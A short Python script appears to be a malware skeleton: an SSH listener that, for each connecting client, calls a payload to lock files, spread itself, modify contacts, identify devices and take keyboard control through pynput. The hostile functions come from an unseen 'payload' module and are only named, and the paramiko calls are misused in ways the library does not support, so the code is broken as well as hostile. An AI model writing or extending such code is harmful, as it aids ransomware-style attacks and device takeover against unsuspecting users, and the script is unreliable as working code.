import paramiko
import pynput
from payload import Payload

ssh_server = paramiko.Server()
ssh_server.load_host_keys()

ssh_server.listen(None)

print("Server listening...")

while True:
    try:
        channel = ssh_server.accept()
        print("Client connected")

        payload = Payload()
        payload.lockFiles(channel)
        payload.spread(channel)
        payload.modifyContacts(channel)
        payload.identifyDevices(channel)

        client = pynput.keyboard.Controller()
        payload.controlDevice(client)

        print("Client disconnected")
    except Exception as e:
        print(f"Error: {e}")